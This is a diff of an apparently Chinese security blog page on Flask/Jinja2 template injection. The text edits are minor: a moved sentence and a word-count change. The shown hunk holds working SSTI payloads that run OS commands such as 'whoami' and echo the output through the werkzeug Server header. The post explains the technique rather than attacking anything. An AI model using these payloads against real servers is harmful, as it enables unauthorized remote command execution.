@@ -495,9 +495,9 @@ Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是
 <pre class="line-numbers language-language-python"><code class="language-language-python">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>同样的还可以利用这个sys_version，只不过这里是直接调用的类的属性：</p>
-<p>像server_version一样的“调用方法”。所以payload如下：</p>
 <pre><code>{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}
 </code></pre>
+<p>像server_version一样的“调用方法”。所以payload如下：</p>
 <p>获取sys模块不只这种，同样的还存在于全局变量中，所以其实直接获取即可，如下payload：</p>
 <pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
 </code></pre>
@@ -957,7 +957,7 @@ Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">8.4k</span>
+                        class="white-color">8.5k</span>
             
             
             
